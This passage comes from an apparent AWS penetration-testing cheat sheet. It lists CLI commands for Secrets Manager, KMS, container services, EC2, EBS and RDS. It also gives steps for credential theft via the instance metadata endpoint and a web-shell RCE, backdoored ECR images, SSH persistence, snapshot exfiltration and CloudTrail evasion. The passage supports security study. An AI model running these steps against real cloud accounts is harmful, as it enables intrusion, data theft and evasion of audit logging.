<div class="highlight"><pre><span></span><code><a id="__codelineno-142-1" name="__codelineno-142-1" href="#__codelineno-142-1"></a>aws secretsmanager describe-secret --secret-id name
</code></pre></div>
<h3 id="getting-policies-attached-to-the-specified-secret">Getting policies attached to the specified secret</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-143-1" name="__codelineno-143-1" href="#__codelineno-143-1"></a>aws secretsmanager get-resource-policy --secret-id ID
</code></pre></div>
<h3 id="listing-keys-in-kms">Listing keys in KMS</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-144-1" name="__codelineno-144-1" href="#__codelineno-144-1"></a>aws kms list-keys
</code></pre></div>
<h3 id="listing-information-about-a-specific-key">Listing information about a specific key</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-145-1" name="__codelineno-145-1" href="#__codelineno-145-1"></a>aws kms describe-key --key-id ID
</code></pre></div>
<h3 id="listing-policies-attached-to-a-specific-key">Listing policies attached to a specific key</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-146-1" name="__codelineno-146-1" href="#__codelineno-146-1"></a>aws kms list-key-policies --key-id ID
</code></pre></div>
<h3 id="getting-full-information-about-a-policy">Getting full information about a policy</h3>
<ul>
<li>Shows who can access the keys</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-147-1" name="__codelineno-147-1" href="#__codelineno-147-1"></a>aws kms get-key-policy --policy-name name --key-id ID
</code></pre></div>
<h2 id="credential-exfiltration">Credential Exfiltration</h2>
<ul>
<li>If the user has access to Secret Manager, it can decrypt the secrets using the web, cli or API</li>
</ul>
<h3 id="listing-policies-attached-to-an-user">Listing policies attached to an user</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-148-1" name="__codelineno-148-1" href="#__codelineno-148-1"></a>aws iam list-attached-user-policies --user-name name
</code></pre></div>
<h3 id="retrieving-information-about-a-specific-version-of-policy">Retrieving information about a specific version of policy</h3>
<ul>
<li>Here we can see the permissions</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-149-1" name="__codelineno-149-1" href="#__codelineno-149-1"></a>aws iam get-policy-version --policy-arn arn --version-id id
</code></pre></div>
<h3 id="listing-all-secrets-stored-by-secret-manager_1">Listing all secrets stored by Secret Manager</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-150-1" name="__codelineno-150-1" href="#__codelineno-150-1"></a>aws secretsmanager list-secrets
</code></pre></div>
<h3 id="listing-information-about-a-specific-secret_1">Listing information about a specific secret</h3>
<ul>
<li>Here we get the secret Key Id to descript the secret</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-151-1" name="__codelineno-151-1" href="#__codelineno-151-1"></a>aws secretsmanager describe-secret --secret-id name
</code></pre></div>
<h3 id="getting-resource-based-policy-attached-to-an-specific-secret">Getting resource-based policy attached to an specific secret</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-152-1" name="__codelineno-152-1" href="#__codelineno-152-1"></a>aws secretsmanager get-resource-policy --secret-id ID
</code></pre></div>
<h3 id="getting-the-secret-value">Getting the secret value</h3>
<ul>
<li>Retrieves the actual value</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-153-1" name="__codelineno-153-1" href="#__codelineno-153-1"></a>aws secretsmanager get-secret-value --secret-id ID
</code></pre></div>
<h3 id="kms">KMS</h3>
<ul>
<li>If we compromised as an example an S3 with an encrypted file, we can decrypt it using the keys stored in KMS.</li>
</ul>
<h4 id="listing-an-specific-key">Listing an specific key</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-154-1" name="__codelineno-154-1" href="#__codelineno-154-1"></a>aws kms describe-key --key-id id
</code></pre></div>
<h4 id="listing-policies-attached-to-an-specified-key">Listing policies attached to an specified key</h4>
<ul>
<li>Here we can see who can access the key, the description of it and so on</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-155-1" name="__codelineno-155-1" href="#__codelineno-155-1"></a>aws kms list-key-policies --key-id ID
</code></pre></div>
<h4 id="listing-full-information-about-a-policy">Listing full information about a policy</h4>
<ul>
<li>Run the previous command in all keys to see who can access it</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-156-1" name="__codelineno-156-1" href="#__codelineno-156-1"></a>aws kms get-key-policy --policy-name name --key-id ID
</code></pre></div>
<h4 id="decrypt-the-secret-using-the-key">Decrypt the secret using the key</h4>
<ul>
<li>There is no need to specificy the key information because this information is embbeded in the encrypted file</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-157-1" name="__codelineno-157-1" href="#__codelineno-157-1"></a>aws kms decrypt --ciphertext-blob fileb://EncryptedFile --output text --query plaintext
</code></pre></div>
<h2 id="containers">Containers</h2>
<p>Divided into three categories</p>
<ul>
<li>Registry -&gt; Secure place to store container images (ECR)</li>
<li>Orchestration -&gt; Configure when and where the containters run (ECS,EKS)</li>
<li>Compute -&gt; Use to do computing related tasks (EC2, Fargate)</li>
<li>Its possible to create a backdoor image and add to a EKS  cluster</li>
<li>Always look how VPC's are communicatig with each other, maybe is possible to pivot through the EKS VPC from other VPC and compromise the entire cluster</li>
</ul>
<h2 id="initial-access_1">Initial Access</h2>
<ul>
<li>The initial access can be done by exploiting some RCE in webapp to get access to the container, afterwards its possible to compromise the EC2. </li>
</ul>
<p>After the RCE, we can list all secrets in EKS</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-158-1" name="__codelineno-158-1" href="#__codelineno-158-1"></a>https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount
</code></pre></div>
<h3 id="getting-the-secret-information-from-eks">Getting the secret information from EKS</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-159-1" name="__codelineno-159-1" href="#__codelineno-159-1"></a>https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount/token
</code></pre></div>
<ul>
<li>It's also possible to do sandbox escaping (Tool: <code>deepce</code>)</li>
</ul>
<h2 id="enumeration_3">Enumeration</h2>
<h3 id="ecr">ECR</h3>
<h4 id="listing-all-repositories-in-container-registry">Listing all repositories in container registry</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-160-1" name="__codelineno-160-1" href="#__codelineno-160-1"></a>aws ecr describe-repositories
</code></pre></div>
<h4 id="listing-information-about-repository-policy">Listing information about repository policy</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-161-1" name="__codelineno-161-1" href="#__codelineno-161-1"></a>aws ecr get-repository-policy --repository-name name
</code></pre></div>
<h4 id="listing-all-images-in-a-specific-repository">Listing all images in a specific repository</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-162-1" name="__codelineno-162-1" href="#__codelineno-162-1"></a>aws ecr list-images --repository-name name
</code></pre></div>
<h4 id="listing-information-about-an-image">Listing information about an image</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-163-1" name="__codelineno-163-1" href="#__codelineno-163-1"></a>aws ecr describe-images --repository-name name --images-ids imageTag=name
</code></pre></div>
<h3 id="ecs">ECS</h3>
<h4 id="listing-all-ecs-clusters">Listing all ECS clusters</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-164-1" name="__codelineno-164-1" href="#__codelineno-164-1"></a>aws ecs list-clusters
</code></pre></div>
<h4 id="listing-information-about-an-specific-cluster">Listing information about an specific cluster</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-165-1" name="__codelineno-165-1" href="#__codelineno-165-1"></a>aws ecs describe-clusters --cluster name
</code></pre></div>
<h4 id="listing-all-services-in-specified-cluster">Listing all services in specified cluster</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-166-1" name="__codelineno-166-1" href="#__codelineno-166-1"></a>aws ecs list-services --cluster name
</code></pre></div>
<h4 id="listing-information-about-an-specific-service">Listing information about an specific service</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-167-1" name="__codelineno-167-1" href="#__codelineno-167-1"></a>aws ecs descibe-services --cluster name --services name
</code></pre></div>
<ul>
<li>This command shows the logs of the service</li>
</ul>
<h4 id="listing-tasks-in-specific-cluster">Listing tasks in specific cluster</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-168-1" name="__codelineno-168-1" href="#__codelineno-168-1"></a>aws ecs list-tasks --cluster name
</code></pre></div>
<h4 id="listing-information-about-an-specific-task">Listing information about an specific task</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-169-1" name="__codelineno-169-1" href="#__codelineno-169-1"></a>aws ecs describe-tasks --cluster name -tasks taskArn
</code></pre></div>
<ul>
<li>Also shows information about network, userful if trying to pivot</li>
</ul>
<h4 id="listing-all-containers-in-specified-cluster">Listing all containers in specified cluster</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-170-1" name="__codelineno-170-1" href="#__codelineno-170-1"></a>aws ecs list-container-instances --cluster name
</code></pre></div>
<h3 id="eks">EKS</h3>
<h4 id="listing-all-eks-clusters">Listing all EKS clusters</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-171-1" name="__codelineno-171-1" href="#__codelineno-171-1"></a>aws eks list-clusters
</code></pre></div>
<h4 id="listing-information-about-an-specific-cluster_1">Listing information about an specific cluster</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-172-1" name="__codelineno-172-1" href="#__codelineno-172-1"></a>aws eks describe-cluster --name name
</code></pre></div>
<h4 id="listing-all-node-groups-in-specified-cluster">Listing all node groups in specified cluster</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-173-1" name="__codelineno-173-1" href="#__codelineno-173-1"></a>aws eks list-nodegroups --cluster-name name
</code></pre></div>
<h4 id="listing-specific-information-about-a-node-group-in-a-cluster">Listing specific information about a node group in a cluster</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-174-1" name="__codelineno-174-1" href="#__codelineno-174-1"></a>aws eks describe-nodegroup --cluster-name name --nodegroup-name name
</code></pre></div>
<h4 id="listing-fargate-in-specified-cluster">Listing Fargate in specified cluster</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-175-1" name="__codelineno-175-1" href="#__codelineno-175-1"></a>aws eks list-fargate-profiles --cluster-name cluster-name
</code></pre></div>
<h4 id="listing-information-about-a-fargate-profile-in-a-cluster">Listing information about a fargate profile in a cluster</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-176-1" name="__codelineno-176-1" href="#__codelineno-176-1"></a>aws eks describe-fargate-profiles --cluster-name name --fargate-profile-name name
</code></pre></div>
<h2 id="persistence_1">Persistence</h2>
<ul>
<li>It's possible to modify an existing docker image with a backdoor, when this image is used it will trigger our team server.</li>
</ul>
<h3 id="enumerating-the-user">Enumerating the user</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-177-1" name="__codelineno-177-1" href="#__codelineno-177-1"></a>aws sts get-caller-identity
</code></pre></div>
<h3 id="listing-manager-policies-attached-to-the-iam-role">Listing manager policies attached to the IAM role</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-178-1" name="__codelineno-178-1" href="#__codelineno-178-1"></a>aws iam list-attached-role-policies --role-name name
</code></pre></div>
<h3 id="getting-information-about-the-version-of-the-managed-policy">Getting information about the version of the managed policy</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-179-1" name="__codelineno-179-1" href="#__codelineno-179-1"></a>aws iam get-policy-version --policy-arn arn --version-id id
</code></pre></div>
<h3 id="getting-information-about-the-repositories-in-container-registry">Getting information about the repositories in container registry</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-180-1" name="__codelineno-180-1" href="#__codelineno-180-1"></a>aws ecr describe-repositories
</code></pre></div>
<h3 id="listing-all-images-in-the-repository">Listing all images in the repository</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-181-1" name="__codelineno-181-1" href="#__codelineno-181-1"></a>aws ecr list-images --repository-name name
</code></pre></div>
<h3 id="listing-information-about-an-image_1">Listing information about an image</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-182-1" name="__codelineno-182-1" href="#__codelineno-182-1"></a>aws ecr describe-images --repository-name name --image-ids imageTag=Name
</code></pre></div>
<h3 id="authenticate-the-docker-daemon-to-ecr">Authenticate the docker daemon to ECR</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-183-1" name="__codelineno-183-1" href="#__codelineno-183-1"></a>aws ecr get-login-password --region region | docker login --username AWS --password-stdin ecr_address
</code></pre></div>
<h3 id="building-images-with-backdoor">Building images with backdoor</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-184-1" name="__codelineno-184-1" href="#__codelineno-184-1"></a>docker build -t image_name
</code></pre></div>
<h3 id="tagging-the-docker-image">Tagging the docker image</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-185-1" name="__codelineno-185-1" href="#__codelineno-185-1"></a>docker tag image_name ecr_addr:Image_Name
</code></pre></div>
<h3 id="pushing-the-image-to-ecr">Pushing the image to ECR</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-186-1" name="__codelineno-186-1" href="#__codelineno-186-1"></a>docker push ecr_addr:Image_Name
</code></pre></div>
<h2 id="ec2">EC2</h2>
<ul>
<li>AMI, images used to create virtual machines</li>
<li>It's possible to create a malicious image to compromise users</li>
<li>We can access an instance using SSH Keys, EC2 Instance Connect, Session Manager</li>
<li>The SSH Key method is permanent, we need to gather the private key to connect to the instance</li>
<li>EC2 Instance connect is an IAM right that we can add to a user, enabling us to temporarily connect to an instance</li>
<li>Session manager only work in browser and it does not need SSH Key</li>
<li>Windows machines can be accessed by using RDP, Session Manager</li>
<li>Security Groups acts as a virtual firewall to control inbound and outbound traffic, acts at the instance level, not the subnet level.</li>
</ul>
<h2 id="enumeration_4">Enumeration</h2>
<h3 id="listing-information-about-all-instances">Listing information about all instances</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-187-1" name="__codelineno-187-1" href="#__codelineno-187-1"></a>aws ec2 describe-instances
</code></pre></div>
<h3 id="listing-information-about-a-specific-region">Listing information about a specific region</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-188-1" name="__codelineno-188-1" href="#__codelineno-188-1"></a>aws ec2 describe-instances --region region
</code></pre></div>
<h3 id="listing-information-about-specific-instance">Listing information about specific instance</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-189-1" name="__codelineno-189-1" href="#__codelineno-189-1"></a>aws ec2 describe-instances --instance-ids ID
</code></pre></div>
<h3 id="extracting-userdata-attribute-of-specified-instance">Extracting UserData attribute of specified instance</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-190-1" name="__codelineno-190-1" href="#__codelineno-190-1"></a>aws ec2 describe-instance-attribute --attribute userData --instance-id instanceID
</code></pre></div>
<p><em>This command gathers the metadata from the instance, like commands or secrets. The output is base64 encoded</em></p>
<h3 id="listing-roles-of-an-instance">Listing roles of an instance</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-191-1" name="__codelineno-191-1" href="#__codelineno-191-1"></a>aws ec2 describe-iam-instance-profile-associations
</code></pre></div>
<h2 id="exploitation_1">Exploitation</h2>
<ul>
<li>Initial access can happen by RCE or SSRF</li>
<li>Metadata can be used to exfiltrate information from the instance</li>
</ul>
<h3 id="remote-code-execution">Remote code execution</h3>
<h4 id="aws-metadata">AWS Metadata</h4>
<p>If we have remote code execution or SSRF, we can grab metadata information</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-192-1" name="__codelineno-192-1" href="#__codelineno-192-1"></a>curl http://169.254.169.254/latest/meta-data
</code></pre></div>
<h5 id="grabbing-the-keys-to-access-the-instance">Grabbing the keys to access the instance</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-193-1" name="__codelineno-193-1" href="#__codelineno-193-1"></a>curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
</code></pre></div>
<h5 id="grabbing-the-keys-in-metadata-version-2">Grabbing the keys in metadata version 2</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-194-1" name="__codelineno-194-1" href="#__codelineno-194-1"></a><span class="nv">TOKEN</span><span class="o">=</span><span class="sb">`</span>curl
<a id="__codelineno-194-2" name="__codelineno-194-2" href="#__codelineno-194-2"></a>X<span class="w"> </span>PUT<span class="w"> </span><span class="s2">&quot;http://169.254.169.254/latest/ api /token&quot;</span><span class="w"> </span>H<span class="w"> </span><span class="s2">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span><span class="sb">`</span>
<a id="__codelineno-194-3" name="__codelineno-194-3" href="#__codelineno-194-3"></a><span class="o">&amp;&amp;</span><span class="w"> </span>curl<span class="w"> </span>H<span class="w"> </span><span class="s2">&quot;X-aws-ec2-metadata-token: </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span>v<span class="w"> </span>http://169.254.169.254/latest/meta-data/
</code></pre></div>
<h4 id="aws-userdata">AWS Userdata</h4>
<p>Version 1</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-195-1" name="__codelineno-195-1" href="#__codelineno-195-1"></a>curl http://169.254.169.254/latest/user-data/
</code></pre></div>
<p>Version 2</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-196-1" name="__codelineno-196-1" href="#__codelineno-196-1"></a><span class="nv">TOKEN</span><span class="o">=</span><span class="sb">`</span>curl
<a id="__codelineno-196-2" name="__codelineno-196-2" href="#__codelineno-196-2"></a>X<span class="w"> </span>PUT<span class="w"> </span><span class="s2">&quot;http://169.254.169.254/latest/ api /token&quot;</span><span class="w"> </span>H<span class="w"> </span><span class="s2">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span><span class="sb">`</span>
<a id="__codelineno-196-3" name="__codelineno-196-3" href="#__codelineno-196-3"></a><span class="o">&amp;&amp;</span><span class="w"> </span>curl<span class="w"> </span>H<span class="w"> </span><span class="s2">&quot;X-aws-ec2-metadata-token: </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span>v<span class="w"> </span>http://169.254.169.254/latest/user-data/
</code></pre></div>
<h3 id="privilege-escalation_2">Privilege Escalation</h3>
<ul>
<li>One approach to get a shell in a instance is to put a reverse shell in UserData attribute, when the  instance is launched, we will have the connection.</li>
<li>Another approach happens when we have the iam:PassRole and iam:AmazonEC2FullAccess permissions, we can add an administrator role to the compromised EC2 instance and access aws services.</li>
</ul>
<h4 id="getting-information-about-the-key">Getting information about the key</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-197-1" name="__codelineno-197-1" href="#__codelineno-197-1"></a>aws sts get-caller-identity
</code></pre></div>
<h4 id="getting-policies-attached-to-the-iam-user">Getting policies attached to the IAM user</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-198-1" name="__codelineno-198-1" href="#__codelineno-198-1"></a>aws iam list-attached-user-policies --user-name user_name
</code></pre></div>
<h4 id="getting-information-about-a-specific-policy-version">Getting information about a specific policy version</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-199-1" name="__codelineno-199-1" href="#__codelineno-199-1"></a>aws iam get-policy-version --policy-arn ARN --version-id ID
</code></pre></div>
<p>To attach a role to an EC2 instance, we can use the RCE to grab the ID</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-200-1" name="__codelineno-200-1" href="#__codelineno-200-1"></a>curl http://169.254.169.254/latest/meta-data/instance-id
</code></pre></div>
<h4 id="listing-instance-profiles">Listing instance profiles</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-201-1" name="__codelineno-201-1" href="#__codelineno-201-1"></a>aws iam list-instance-profiles
</code></pre></div>
<h4 id="attach-an-instance-profile-to-an-ec2-instance">Attach an instance profile to an EC2 instance</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-202-1" name="__codelineno-202-1" href="#__codelineno-202-1"></a>aws ec2 associate-iam-instance-profile --instance-id ID --iam-instance-profile Name=ProfileName
</code></pre></div>
<h3 id="credential-access_1">Credential Access</h3>
<ul>
<li>We can grab the credentials by abusing metadata (Web Application with SSRF,RCE and so on)</li>
</ul>
<h4 id="after-the-initial-access">After the initial access</h4>
<ol>
<li>Enumerate the key (Role)</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-203-1" name="__codelineno-203-1" href="#__codelineno-203-1"></a>aws sts get-caller-identity
</code></pre></div>
<ol>
<li>If there are roles associated with the key, we can grab the credentials by issuing a request to the metadata endpoint (v1 or v2)</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-204-1" name="__codelineno-204-1" href="#__codelineno-204-1"></a>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_OF_PREVIOUS_COMMAND
</code></pre></div>
<ol>
<li>Configure the aws cli</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-205-1" name="__codelineno-205-1" href="#__codelineno-205-1"></a>aws configure 
</code></pre></div>
<p>Or use enviroment variables.</p>
<h3 id="persistence_2">Persistence</h3>
<ul>
<li>All the persistence techniques works here, SSH persistence, vim backdoor and so on.</li>
</ul>
<h4 id="ssh-persistence-example">SSH Persistence example</h4>
<ol>
<li>Generate SSH Key pair</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-206-1" name="__codelineno-206-1" href="#__codelineno-206-1"></a>ssh-keygen
</code></pre></div>
<ol>
<li>Add public key to authorized_keys</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-207-1" name="__codelineno-207-1" href="#__codelineno-207-1"></a>echo &quot;PUBLIC_Key&quot; &gt;&gt; /home/user/.ssh/authorized_keys
</code></pre></div>
<ol>
<li>Use the private key to connect </li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-208-1" name="__codelineno-208-1" href="#__codelineno-208-1"></a>ssh -i public_key user@instance
</code></pre></div>
<h1 id="elastic-block-store">Elastic Block Store</h1>
<ul>
<li>Block storage system used to store persistent data</li>
<li>It's possible to attach this drive to EC2 and increase the storage (Like and HD, but scalable).</li>
<li>It's possible to create a snapshot (It will be saved on S3) and create a volume from this snapshot.</li>
<li>It's possible to attach the snapshot (Backup of BS) to an EC2 instance</li>
<li>Snapshots can be used as volumes or AMI's</li>
</ul>
<h2 id="enumeration_5">Enumeration</h2>
<h3 id="enumerating-ebs-volumes">Enumerating EBS volumes</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-209-1" name="__codelineno-209-1" href="#__codelineno-209-1"></a>aws ec2 describe-volumes
</code></pre></div>
<ul>
<li>If the volume is available, it can be attached to an EC2 instance</li>
<li>Check if the EBS is encrypted</li>
</ul>
<h3 id="enumerating-snapshots">Enumerating Snapshots</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-210-1" name="__codelineno-210-1" href="#__codelineno-210-1"></a>aws ec2 describe-snapshots --owner-ids self 
</code></pre></div>
<ul>
<li>Also check if the snapshot is encrypted</li>
</ul>
<h2 id="exploitation-data-exfiltration">Exploitation &amp; Data Exfiltration</h2>
<ul>
<li>Create a snapshot of an EC2 instance, create a volume from snapshot and attach to other EC2 instance. </li>
<li>User need to have IAM permissions on EC2</li>
<li>Maybe we don't have the right to access the instance but have rights to create a snapshot and attach it to another machine.</li>
</ul>
<h3 id="creating-a-snapshot-of-a-specified-volume">Creating a snapshot of a specified volume</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-211-1" name="__codelineno-211-1" href="#__codelineno-211-1"></a>aws ec2 create-snapshot --volume volumeID --description &quot;Example&quot; --profile profile_name
</code></pre></div>
<h3 id="listing-snapshots">Listing snapshots</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-212-1" name="__codelineno-212-1" href="#__codelineno-212-1"></a>aws ec2 describe-snapshots
</code></pre></div>
<h3 id="creating-a-volume-from-a-snasphot">Creating a volume from a snasphot</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-213-1" name="__codelineno-213-1" href="#__codelineno-213-1"></a>aws ec2 create-volume --snapshot-id ID --availability-zone ZONE --profile profile_name
</code></pre></div>
<ul>
<li>The volume needs to be in the same availability zone as the instance we have access</li>
</ul>
<h3 id="attaching-the-volume-to-an-instance">Attaching the volume to an instance</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-214-1" name="__codelineno-214-1" href="#__codelineno-214-1"></a>aws ec2 attach-volume --volume-id VolumeID --instance-id InstanceID --device /dev/sdfd -&gt; Can be other value
</code></pre></div>
<h3 id="mounting-the-volume">Mounting the volume</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-215-1" name="__codelineno-215-1" href="#__codelineno-215-1"></a>sudo mount /dev/sdfd /directory
</code></pre></div>
<p>After mounting, we will have access to the disk. </p>
<h1 id="rds-relational-database-service">RDS - Relational Database Service</h1>
<ul>
<li>Service to use, operate and scale relational databases in AWS (MariaDB, MySQL and similar)</li>
<li>The access is done by using password, password+IAM or password+kerberos</li>
<li>It's possible to restrict access using restriction such as specific EC2 or lambda or use network level restriction such as vpc, ip.</li>
<li>RDS Proxy hadles the traffic between the application and the database, it enables the enforcing of IAM permissions and use secrets manager to store credentials.</li>
</ul>
<h2 id="enumeration_6">Enumeration</h2>
<h3 id="listing-information-about-clusters-in-rds">Listing information about clusters in RDS</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-216-1" name="__codelineno-216-1" href="#__codelineno-216-1"></a>aws rds describe-db-clusters
</code></pre></div>
<h3 id="listing-information-about-rds-instances">Listing information about RDS instances</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-217-1" name="__codelineno-217-1" href="#__codelineno-217-1"></a>aws rds describe-db-instances
</code></pre></div>
<ul>
<li>IAMDatabaseAuthenticationEnabled: false -&gt; Need password to access the instance</li>
</ul>
<h3 id="listing-information-about-subnet-groups-in-rds">Listing information about subnet groups in RDS</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-218-1" name="__codelineno-218-1" href="#__codelineno-218-1"></a>aws rds describe-db-subnet-groups
</code></pre></div>
<h3 id="listing-information-about-database-security-groups-in-rds">Listing information about database security groups in RDS</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-219-1" name="__codelineno-219-1" href="#__codelineno-219-1"></a>aws rds describe-db-security-groups
</code></pre></div>
<h3 id="listing-information-about-database-proxies">Listing information about database proxies</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-220-1" name="__codelineno-220-1" href="#__codelineno-220-1"></a>aws rds describe-db-proxies
</code></pre></div>
<h2 id="data-exfiltration_1">Data exfiltration</h2>
<ul>
<li>If the instance is in a security group or VPC, we need to compromise it first to access the database (For example, we compromise an EC2 instance in the same VPC, then its possible to connect)</li>
</ul>
<h3 id="list-instances-in-rds">List instances in RDS</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-221-1" name="__codelineno-221-1" href="#__codelineno-221-1"></a>aws rds describe-db-instances
</code></pre></div>
<h3 id="list-information-about-the-specified-security-group">List information about the specified security group</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-222-1" name="__codelineno-222-1" href="#__codelineno-222-1"></a>aws ec2 describe-security-groups --group-ids id
</code></pre></div>
<h3 id="password-based-authentication">Password based authentication</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-223-1" name="__codelineno-223-1" href="#__codelineno-223-1"></a>mysql -h hostname -u name -P port -p password
</code></pre></div>
<h3 id="iam-based-authentication">IAM Based authentication</h3>
<p><strong>1. Identify the user</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-224-1" name="__codelineno-224-1" href="#__codelineno-224-1"></a>aws sts get-caller-identity
</code></pre></div>
<p><strong>2. List all policies attached to a role</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-225-1" name="__codelineno-225-1" href="#__codelineno-225-1"></a>aws iam list-attached-role-policies --role-name name
</code></pre></div>
<p><strong>3. Get information about a specific version of a policy</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-226-1" name="__codelineno-226-1" href="#__codelineno-226-1"></a>aws iam get-policy-version --policy-arn arn --version-id ID
</code></pre></div>
<p><strong>4. Get a temporary token from the RDS</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-227-1" name="__codelineno-227-1" href="#__codelineno-227-1"></a>aws rds generate-db-auth-token --hostname hostname --port port --username username --region region
</code></pre></div>
<ul>
<li>To be easier, we can put it in a variable</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-228-1" name="__codelineno-228-1" href="#__codelineno-228-1"></a>TOKEN=$(aws rds generate-db-auth-token --hostname hostname --port port --username username --region region)
</code></pre></div>
<p><strong>5. Connect to the DB using the token</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-229-1" name="__codelineno-229-1" href="#__codelineno-229-1"></a>mysql -h hostname -u name -P port --enable-cleartext-plugin --user=user --password=$TOKEN
</code></pre></div>
<h2 id="sso-other-services">SSO &amp; Other Services</h2>
<h2 id="single-sign-on-sso">Single Sign On (SSO)</h2>
<ul>
<li>Used to centrally manage access to multiple AWS accounts and applications. </li>
<li>Provide users a way to interact with all services and applications through one place</li>
<li>Can be used to manage access and user permissions to all AWS accounts</li>
<li>The identity source can use AWS SSO's identity store or external identity store (Okta,SAML and similar)</li>
</ul>
<h2 id="cloudtrail">CloudTrail</h2>
<ul>
<li>Log monitoring service, allow us to continuously monitor and retain account activity related to actions in our AWS account </li>
<li>Provide event history of AWS account activity, SDKs, command line tools and other services</li>
<li>Commonly used to detect unsual behavior in AWS account</li>
<li>Pacu automatically changes the user agent to deceive the logs of cloudtrail</li>
</ul>
<h3 id="userful-commands">Userful Commands</h3>
<h4 id="list-trails">List trails</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-230-1" name="__codelineno-230-1" href="#__codelineno-230-1"></a>aws cloudtrail list-trails
</code></pre></div>
<h4 id="disabling-cloudtrail">Disabling CloudTrail</h4>
